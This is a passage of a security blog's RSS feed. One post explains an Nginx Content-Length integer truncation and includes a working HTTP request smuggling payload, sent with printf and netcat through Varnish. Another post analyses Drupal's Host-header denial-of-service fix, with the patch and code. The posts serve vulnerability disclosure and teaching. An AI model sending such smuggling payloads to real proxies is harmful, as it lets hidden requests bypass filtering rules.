'90000000000000000000000000000000000000000000000000000000000' =&amp;gt; 288230376151711744
'900000000000000000000000000000000000000000000000000000000000000' =&amp;gt; 4611686018427387904
'9000000000000000000000000000000000000000000000000000000000000000' =&amp;gt; -9223372036854775808
'9999999999999999999999999999999999999999999991000000000000000000' =&amp;gt; -9000000000000000000
'9999999999999999999999999999999999999999999999900000000000000000' =&amp;gt; -100000000000000000
'9999999999999999999999999999999999999999999999990000000000000000' =&amp;gt; -10000000000000000
'9999999999999999999999999999999999999999999999999999999999999990' =&amp;gt; -10
'90000000000000000000000000000000000000000000000000000000000000000' =&amp;gt; 0
'90000000000000000000000000000000000000000000000000000000000000015' =&amp;gt; 15
'900000000000000000000000000000000000000000000000000000000000000000000000015' =&amp;gt; 15
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The fixed version of this same function (my own proposal was a return as soon as &lt;code&gt;value&lt;/code&gt; was lower than previous value in the for loop):&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;ngx_atosz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
   
        &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_MAX_SIZE_T_VALUE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;cutlim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_MAX_SIZE_T_VALUE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
   
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;9&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutoff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cutlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NGX_ERROR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
            &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Example of exploitation Varnish + Nginx&lt;/h2&gt;

&lt;p&gt;To exploit this integer truncation we have to send a very-very-very big content-length header, so big that we cannot really send such a big query (for example 36893488147419103232, the first 0, is 32 768 Petabytes); and we need to get the request body transferred to nginx without a buffering proxy (because we cannot wait for a full request buffering, we need the proxy to send the request to nginx while still receiving inputs). This can be done using Varnish (at least, they may be others). An Apache mod_proxy server would reject such a big Content-Length header, but not Varnish.&lt;/p&gt;

&lt;p&gt;We need a proxy because the basics of an HTTP Smuggling attack is precisely to have differences in the interpretation of the request by two actors, here the varnish proxy as first actor and the Nginx backend as the second one.&lt;/p&gt;

&lt;p&gt;Now when Nginx will receive this request from the Varnish proxy it will read a completely different and shorter Content-Length Header, and this means we can hide new HTTP requests in the transferred request body. Something than the proxy did not saw as a request.&lt;/p&gt;

&lt;p&gt;Note that we will never receive the results from that hidden query, and that we will have to close the initial query (because the number of bytes to transfer is too high). So there is no way of poisoning the reverse proxy cache (here Varnish). The only usage of such exploit is to bypass security rules that could be written in Varnish and forgotten in Nginx and use that to send a request where the result as no importance. A good defense in depth policy would enforce rewriting in Nginx security rules defined in the proxy, but if it is not the case this technique could be used to &lt;strong&gt;transfer a blind unfiltered request to Nginx&lt;/strong&gt; (blind because you will never get the response).&lt;/p&gt;

&lt;p&gt;This is the reason why this issue is not considered &quot;serious&quot; by the Nginx project. Alone this flaw is not very useful... but mighty oaks from little acorns grow.&lt;/p&gt;

&lt;p&gt;You could try something like that (here with varnish on port 8080 on 127.0.0.1, with nginx as a backend, and with a POST query containing two hidden queries in the body), try it only at home:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf 'POST /could_fail.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'Content-Type: application/x-www-form-urlencoded\015\012'\
'Content-length: 9000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000015\015\012'\
'\015\012123456789012345GET /hidden.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'\015\012'\
'POST /could_fail.html HTTP/1.1\015\012'\
'Host: www.dummy-host.example.com\015\012'\
'Content-Type: application/x-www-form-urlencoded\015\012'\
'Content-Length: 1048570\015\012'\
'etc..aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
'(... here a quite long filler, something like 500 characters at least because we need varnish'\
'to start transmission of the body and this requires some inputs...)aaaaaaaaaaaaaaaaaaaaaaaaaaa'\
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'| netcat 127.0.0.1 8080
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can try it with a wireshark and see that Nginx respond to all the queries (or you can check the access logs).&lt;/p&gt;

&lt;p&gt;I did not found any malloc error associated with theses integers overflows, but you are free to search that.&lt;/p&gt;

&lt;p&gt;My own conclusion would be: C, how is this still a thing :-)&lt;/p&gt;

&lt;p&gt;More seriously I find distressing that most web servers are still sensitive to low-level C errors like integer overflows, null strings, etc.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2015-03-25 00:00:00 +0100</published>
				<link>http://regilero.github.io/security/english/2015/03/25/nginx-integer_truncation/</link>
			</item>
		
			<item>
				<title>AirPair, Drupal with PHP-FPM, Apache or Nginx</title>
				<description>&lt;h2&gt;AirPair&lt;/h2&gt;

&lt;p&gt;In the pasts I've made some detailled posts about php-fpm for Drupal7 with Apache 2.2. Now you have the Apache 2.4 version which is easier to use with php-fpm. And if you do the things the right way it's also easy to replace Apache with Nginx.&lt;/p&gt;

&lt;p&gt;I made two posts on AirPair to explain all theses things quite deeply:(I apologize for the total lack of humility in the titles):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.airpair.com/nginx/posts/ultimate-guide-migrating-apache-to-nginx-1&quot;&gt;The Ultimate Guide to Migrating From Apache to Nginx: Part 1&lt;/a&gt; which covers the basics, php-fpm and Apache 2.4&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.airpair.com/nginx/posts/ultimate-guide-migrating-apache-to-nginx-2&quot;&gt;The Ultimate Guide to Migrating From Apache to Nginx: Part 2&lt;/a&gt; which covers Nginx&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;That's all.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://twitter.com/regilero&quot;&gt;Stay tuned on twitter, @regilero&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/makinacorpus&quot;&gt;@makinacorpus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
				<published>2014-10-30 00:00:00 +0100</published>
				<link>http://regilero.github.io/english/drupal/2014/10/30/drupal-nginx_apache_php-fpm-guide/</link>
			</item>
		
			<item>
				<title>Details of DRUPAL_SA_CORE_2014_003 Deny Of Service</title>
				<description>&lt;p&gt;&lt;small&gt;&lt;strong&gt;English version&lt;/strong&gt; (&lt;strong&gt;Version Française&lt;/strong&gt; disponible sur &lt;a href=&quot;http://makina-corpus.com/blog/metier/2014/details-of-drupal_sa_core_2014_003&quot;&gt;makina corpus&lt;/a&gt;.)&lt;/small&gt;&lt;/p&gt;

&lt;h2&gt;SA_CORE_2014_003&lt;/h2&gt;

&lt;p&gt;This summer Drupal versions &lt;a href=&quot;https://www.drupal.org/drupal-6.32-release-notes&quot;&gt;6.x&lt;/a&gt; and &lt;a href=&quot;https://www.drupal.org/drupal-7.29-release-notes&quot;&gt;7.29&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://www.drupal.org/drupal-7.31-release-notes&quot;&gt;7.31&lt;/a&gt; have been released with some critical security fixs. Enough time as passed, so I will give some details one of the issues from &lt;a href=&quot;https://www.drupal.org/SA-CORE-2014-003&quot;&gt;SA-CORE-2014-003 - Drupal core - Multiple vulnerabilities&lt;/a&gt;. It contains 3 issues. The one we will study here is the Core &lt;strong&gt;Deny of Service&lt;/strong&gt; (DOS) issue which is also available in the CVE database as &lt;a href=&quot;http://www.cvedetails.com/cve/CVE-2014-5019/&quot;&gt;CVE-2014-5019&lt;/a&gt;. This post is a detailled explanation of how drupal is using the Host header of the http request to find the configuration file, and why this was usable in a deny of service attack even for websites not using the multisite feature. It contains some not very well known things on Host header manipulations, so I hope this will help other projects from avoiding theses issues.&lt;/p&gt;

&lt;p&gt;Note that there were a regression in Drupal 7.29, with images and files attached to taxonomy terms which has been fixed on the next release 7.30 (the regression was not about the patch discussed here).&lt;/p&gt;

&lt;p&gt;Note also that another core security issue has been fixed right after this one (&lt;a href=&quot;https://www.drupal.org/SA-CORE-2014-004&quot;&gt;SA-CORE-2014-004 - Drupal core - Multiple vulnerabilities&lt;/a&gt;, which was another DOS issue coming from &lt;code&gt;xmlrpc.php&lt;/code&gt;, so if you do not have something preventing remote access to this php file you should really upgrade your drupal code version to version &lt;code&gt;7.31&lt;/code&gt;. My own advice is to alter your Apache/Nginx configuration to only allow one PHP file, &lt;code&gt;index.php&lt;/code&gt;, this will prevent a loooot of problems.&lt;/p&gt;

&lt;p&gt;If you have some fears on updating the Core you can at least apply &lt;a href=&quot;https://www.drupal.org/files/issues/sec-D7-conf-path-dos-105258-23.patch&quot;&gt;the DOS patch&lt;/a&gt; for this first DOS issue (this is not the patch for the xmlrpc.php issue), which is quite simple:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;diff --git a/includes/bootstrap.inc b/includes/bootstrap.inc
index 0b81dc0..dc08dd6 100644
--- a/includes/bootstrap.inc
+++ b/includes/bootstrap.inc
@@ -700,7 +700,14 @@ function drupal_environment_initialize() {
  *  TRUE if only containing valid characters, or FALSE otherwise.
  */
 function drupal_valid_http_host($host) {
-  return preg_match('/^\[?(?:[a-zA-Z0-9-:\]_]+\.?)+$/', $host);
+  // Limit the length of the host name to 1000 bytes to prevent DoS attacks with
+  // long host names.
+  return strlen($host) &amp;lt;= 1000
+    // Limit the number of subdomains and port separators to prevent DoS attacks
+    // in conf_path().
+    &amp;amp;&amp;amp; substr_count($host, '.') &amp;lt;= 100
+    &amp;amp;&amp;amp; substr_count($host, ':') &amp;lt;= 100
+    &amp;amp;&amp;amp; preg_match('/^\[?(?:[a-zA-Z0-9-:\]_]+\.?)+$/', $host);
 }
&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;So, what was the problem?&lt;/h2&gt;

&lt;h3&gt;Spoofable Hostnames&lt;/h3&gt;

&lt;p&gt;By simply checking the patch we can see that the goal is to prevent :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;hostnames longer than 1000 characters&lt;/li&gt;
&lt;li&gt;hostnames with more than 100 dots (or subdomains)&lt;/li&gt;
&lt;li&gt;hostnames with more than 100 &lt;code&gt;:&lt;/code&gt; (used on ports and sometimes for IPv6)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;The &lt;strong&gt;hostname&lt;/strong&gt; is a very important part of the client HTTP request. When you are requesting a website, which could be a drupal website, your client HTTP request will send several headers and on of theses headers is the hostname, it is the &lt;strong&gt;Host:&lt;/strong&gt; header:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;GET /page/foo?z=42 HTTP/1.1
Host: www.example.com
(other headers)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The HTTP server receiving this request will decide which VirtualHost will have to handle the request, usually using the Host header to choose between several VirtualHosts (sometimes a same HTTP server is used to manage hundreds of websites). Usually this Host header should contain your website &lt;strong&gt;DNS&lt;/strong&gt;. This header is required for HTTP/1.1 and can also be used with HTTP/1.0.&lt;/p&gt;

&lt;p&gt;But this header is &lt;strong&gt;spoofable&lt;/strong&gt; by the client, so it could contain anything. Hopefully (or at least that's what you usually hope) having a bad Host header should prevent the request from reaching your valid Drupal installation because of several facts:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;really bad injections (like null-bytes) are detected by the HTTP server and the connection is closed&lt;/li&gt;
&lt;li&gt;Headers cannot use more than 8000 characters (more or less), this limits the size of the spoofed header (but, hey, 8000 is quite huge)&lt;/li&gt;
&lt;li&gt;unrecognized hostnames goes to the default Virtualhost, which may not be your Drupal website&lt;/li&gt;
&lt;li&gt;Drupal also ensure this Hostname only contains a small subset of valid characters&lt;/li&gt;
&lt;li&gt;multiple Host headers are concatenated with &lt;code&gt;,&lt;/code&gt; (comma and space -- and drupal rejects spaces in headers)&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;In 2013 an excellent paper on &lt;a href=&quot;http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html&quot;&gt;Practical Host headers attacks&lt;/a&gt; have been published by &lt;a href=&quot;https://plus.google.com/+JamesKettle/about&quot;&gt;James Kettle&lt;/a&gt; and we can see several very important facts in this paper:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;the &lt;strong&gt;default Virtualhost protection does not work&lt;/strong&gt;, more on that at the end of this page. This is valid for both &lt;strong&gt;Nginx&lt;/strong&gt; and &lt;strong&gt;Apache&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;any application having too much trust on this spoofable Header may suffers from issues.&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;This paper was studied by the drupal security team, &lt;a href=&quot;https://www.drupal.org/node/2221699&quot;&gt;you can check the discussions here&lt;/a&gt;, and one fact to remember about this discussion is that &lt;strong&gt;you should always enforce the &lt;code&gt;$base_url&lt;/code&gt; setting&lt;/strong&gt; when running Drupal in production to avoid attacks based on password renewable mails.&lt;/p&gt;

&lt;p&gt;So far so good, no real problems.&lt;/p&gt;

&lt;h3&gt;conf_path() settings file search&lt;/h3&gt;

&lt;p&gt;Drupal already had a &lt;code&gt;drupal_valid_http_host&lt;/code&gt; function ensuring the hostnames did not contain bad characters like &lt;code&gt;/&lt;/code&gt;,&lt;code&gt;\&lt;/code&gt;,&lt;code&gt;%&lt;/code&gt;,&lt;code&gt;&lt;/code&gt; or &lt;code&gt;&amp;amp;&lt;/code&gt;. Only letters, digits, dots and &lt;code&gt;:&lt;/code&gt;. Not relying on the HTTP server to ensure a really clean Hostname, always good to add some security layers in the application.&lt;/p&gt;

&lt;p&gt;This was a good security point, because this hostname is used in &lt;code&gt;conf_path()&lt;/code&gt; function, and this is a very early function in the drupal bootstraping process.&lt;/p&gt;

&lt;p&gt;One of the early step done while bootstraping Drupal is to load the configuration file. This file will give you, for example, access to the database, or the &lt;code&gt;$base_url&lt;/code&gt; enforced setting.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;sd&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;     * Sets the base URL, cookie domain, and session name from configuration.&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;     */&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;drupal_settings_initialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
      &lt;span class=&quot;c1&quot;&gt;// Export these settings.php variables to the global namespace.&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$databases&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$installed_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;$update_free_access&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db_prefix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$drupal_hash_salt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$is_https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_secure_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$base_insecure_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;conf_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/settings.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;DRUPAL_ROOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;conf_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/settings.php&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here we see that the settings path depends on the &lt;code&gt;conf_path()&lt;/code&gt; call. This function is quite short, there's a &lt;code&gt;drupal_static&lt;/code&gt; thing which is simply a way to avoid re-doing stuff after the first call (in the same HTTP request), it's basically a lazy-loading-run-only-once shortcut.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;conf_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$require_settings&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$reset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;drupal_static&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__FUNCTION__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&amp;lt;-- here is the run-only-once thing I was talking about&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
      &lt;span class=&quot;nv&quot;&gt;$confdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;sites&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
      &lt;span class=&quot;nv&quot;&gt;$sites&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
